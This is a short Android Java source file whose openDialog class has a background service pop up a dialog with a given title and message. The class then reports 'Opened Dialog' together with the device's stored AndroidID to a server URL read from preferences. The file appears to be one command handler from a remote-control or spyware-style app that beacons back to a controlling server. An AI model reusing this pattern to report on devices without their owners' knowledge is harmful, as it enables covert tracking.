package u.can.i.up.expert.utils;

import android.content.Intent;
import android.os.AsyncTask;

import java.io.UnsupportedEncodingException;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;
import u.can.i.up.expert.framework.Dialog;
import android.preference.PreferenceManager;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class openDialog extends AsyncTask<String, Void, String> {
    String i = "";
    String j = "";
    public openDialog(String i, String j) {
        this.i = i;
        this.j = j;
    }
    @Override
    protected String doInBackground(String... params) {

        Intent intent = new Intent(DataSet.getInstance().myService.getApplicationContext(), Dialog.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("Title", i);
        intent.putExtra("Message", j);
        DataSet.getInstance().myService.startActivity(intent);

        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Opened Dialog: " + i + " : " + j);
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
//
        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {/*httpcalldone*/}
    @Override
    protected void onPreExecute() {/*httpcallexecuting*/}
    @Override
    protected void onProgressUpdate(Void... values) {
    }
}